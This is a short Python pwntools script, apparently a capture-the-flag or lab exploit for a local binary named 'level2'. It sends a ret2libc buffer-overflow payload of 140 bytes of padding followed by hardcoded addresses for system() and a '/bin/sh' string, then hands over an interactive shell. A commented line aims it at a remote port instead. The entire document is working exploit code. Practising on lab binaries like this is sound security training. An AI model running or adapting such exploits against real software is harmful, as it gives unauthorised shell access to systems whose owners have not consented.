#!/usr/bin/env python
from pwn import *

p = process('./level2')
#p = remote('127.0.0.1',10002)

#ret = 0xdeadbeef

ret = 0x12345678
systemaddr=0xf7df3b40
binshaddr=0xf7f33aaa

payload =  'A'*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)

p.sendline(payload)

p.interactive()



